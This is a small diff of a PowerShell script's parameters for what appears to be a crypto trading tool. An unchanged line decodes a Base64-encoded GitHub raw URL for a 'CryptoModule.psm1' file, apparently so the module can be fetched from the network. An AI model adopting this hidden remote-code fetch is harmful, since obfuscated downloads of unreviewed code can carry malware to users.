@@ -1,8 +1,7 @@
 [Parameter(Mandatory = $false)][int] $WaitTime = 600
-[Parameter(Mandatory = $false)][int] $Count = 0
 [Parameter(Mandatory = $false)][string] $Branch = 'Beta'
 [Parameter(Mandatory = $false)][string] $FileName = 'CryptoModule.psm1'
-[Parameter(Mandatory = $false)][switch] $ignoreInit
+[Parameter(Mandatory = $false)][switch] $IgnoreInit
 [Parameter(Mandatory = $false)][switch] $KeepModule
 
 $bytes = [Convert]::FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NvbGRvZzg2L2FsZ29UcmFkaW5nL3JlZnMvaGVhZHMvPGJyYW5jaD4vY3J5cHRvL1NjcmlwdHMvPGZpbGVOYW1lPg==")
